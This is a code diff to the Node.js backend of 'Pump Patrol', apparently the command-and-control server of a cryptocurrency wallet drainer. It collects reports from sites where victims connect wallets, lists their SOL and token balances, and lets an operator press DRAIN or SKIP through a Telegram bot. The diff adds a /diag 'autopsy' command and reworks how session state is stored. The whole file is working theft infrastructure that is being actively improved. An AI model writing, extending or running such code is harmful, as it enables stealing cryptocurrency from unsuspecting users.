@@ -48,13 +48,13 @@ async function handle(m){
   if(!CHAT)return reply(`chat id: ${m.chat.id} — set TG_CHAT and restart`);
   const[t,sid]=String(m.text||'').trim().split(/\s+/);
   const c=t.toLowerCase();
-  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/clear — drop stale sessions (or /clear sid)\n/approve sid — allow drain\n/skip sid — decline');
+  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent\n/diag sid — autopsy one session\n/diag — autopsy all\n/clear — drop stale (or /clear sid)\n/approve sid — allow drain\n/skip sid — decline');
   if(c==='/sessions'){
     if(!sessions.size)return reply('no sessions recorded');
     const n=Date.now();
     let s='';
     for(const[k,v]of sessions){
-      const w2=v.wallets||[];
+      const w2=(v.ready&&v.ready.wallets)||[];
       const sol=w2.reduce((a,w)=>a+(+w.sol||0),0);
       const nt=w2.reduce((a,w)=>a+((w.tokens||[]).length),0);
       const label=v.done?(v.note==='expired — no response'?'expired':'done'):((!w2.length&&n-v.ts>300000)?'stale':'live');
@@ -62,25 +62,56 @@ async function handle(m){
     }
     return reply(`<b>sessions</b>\n${s}`);
   }
+  if(c==='/diag'){
+    if(sid){
+      const s=sessions.get(sid);
+      if(!s)return reply('no session <code>'+esc(sid)+'</code>');
+      return reply(diagCard(sid,s));
+    }
+    if(!sessions.size)return reply('no sessions to diagnose');
+    let out='';for(const[k,v]of sessions)out+=diagCard(k,v);
+    return reply(out);
+  }
   if(c==='/clear'){
     if(sid&&sessions.has(sid)){sessions.delete(sid);return reply('cleared <code>'+esc(sid)+'</code>')}
-    const n=sessions.size;
-    sessions.clear();
+    const n=sessions.size;sessions.clear();
     return reply(n?'cleared '+n+' sessions':'nothing to clear');
   }
   if(c==='/approve'||c==='/go'){
     if(!sid)return reply('usage: /approve sid');
     if(sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply('approved <code>'+esc(sid)+'</code>')}
-    return reply('unknown session '+esc(sid));
+    return reply('unknown session <code>'+esc(sid)+'</code>');
   }
   if(c==='/skip'||c==='/stop'){
     if(!sid)return reply('usage: /skip sid');
     if(sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply('skipped <code>'+esc(sid)+'</code>')}
-    return reply('unknown session '+esc(sid));
+    return reply('unknown session <code>'+esc(sid)+'</code>');
   }
 }
 
 function btns(sid){return{inline_keyboard:[[{text:'DRAIN',callback_data:'go:'+sid},{text:'SKIP',callback_data:'stop:'+sid}]]}}
+
+function diagCard(sid,s){
+  let o='🔍 <code>'+esc(sid)+'</code>\n';
+  o+='site: '+esc(s.site||'?')+'\n';
+  const ph=s.phases||{};
+  o+='phases: '+(Object.keys(ph).length?Object.keys(ph).join(' → '):'none')+'\n';
+  if(s.scan){
+    const d=s.scan.detected||[];
+    o+='detected: '+(d.length?d.map(x=>x.name+(x.has?' ✓':' ✗')).join(', '):'none')+'\n';
+  }
+  const w=(s.ready&&s.ready.wallets)||[];
+  if(s.ready){
+    if(w.length)for(const x of w){
+      o+='\n'+esc(x.name)+' <code>'+esc(x.addr)+'</code>\n'+x.sol+' SOL';
+      for(const t of x.tokens||[])o+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);
+    }else o+='\nready — no wallets detected in that browser\n';
+  }else o+='\nnot reached ready — stuck in connect/read (see detected above)\n';
+  if(s.fault)o+='\nFAULT: '+esc(s.fault.fault||s.fault.note||'unknown')+'\n';
+  const v=verdicts.get(sid);
+  o+='\nverdict: '+(v?('<b>'+v.a+'</b> pending'):(s.done?(s.note||'done'):'none pending'))+'\n';
+  return o+'\n';
+}
 
 function readyCard(sid,r){
   let s='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n\n<b>WALLET CONNECTED — READY TO DRAIN</b>\n';
@@ -152,24 +183,28 @@ http.createServer(async(req,res)=>{
       if(seg[1]==='report'&&req.method==='POST'){
         let b='';for await(const c of req){b+=c;if(b.length>65536)throw 0}
         const r=JSON.parse(b);
-        r.ts=Date.now();r.done=(r.phase==='done');
-        const prev=sessions.get(sid);
-        if(prev&&prev.msgId)r.msgId=prev.msgId;
-        if(prev&&r.done)r.wallets=prev.wallets||r.wallets;
-        if(prev&&r.done&&!r.site)r.site=prev.site;
-        sessions.set(sid,r);
         const ph=r.phase||'ready';
+        let s=sessions.get(sid)||{};
+        s.phases=s.phases||{};s.phases[ph]=Date.now();
+        s.site=r.site||s.site;
+        s.done=(ph==='done');
+        if(ph==='start'||ph==='scan')s.scan=r;
+        if(ph==='ready')s.ready=r;
+        if(ph==='fault')s.fault=r;
+        if(ph==='done'){s.wallets=(s.ready&&s.ready.wallets)||r.wallets;s.note=r.note;}
+        if(r.msgId)s.msgId=r.msgId;
+        sessions.set(sid,s);
         let text;
         if(ph==='start')text='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n…connecting wallets';
         else if(ph==='fault')text='<b>session '+esc(sid)+' — FAULT</b>\n'+esc(r.fault||r.note||'unknown')+'\nsource: '+esc(r.site||'?');
         else if(ph==='done')text=doneCard(sid,r);
         else text=readyCard(sid,r);
         const buttons=(ph==='ready');
-        if(r.msgId){
-          await api('editMessageText',{chat_id:CHAT,message_id:r.msgId,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
+        if(s.msgId){
+          await api('editMessageText',{chat_id:CHAT,message_id:s.msgId,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
         }else{
           const sent=await api('sendMessage',{chat_id:CHAT,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
-          if(sent&&sent.message_id)sessions.get(sid).msgId=sent.message_id;
+          if(sent&&sent.message_id){sessions.get(sid).msgId=sent.message_id}
         }
         return json(res,{ok:true});
       }
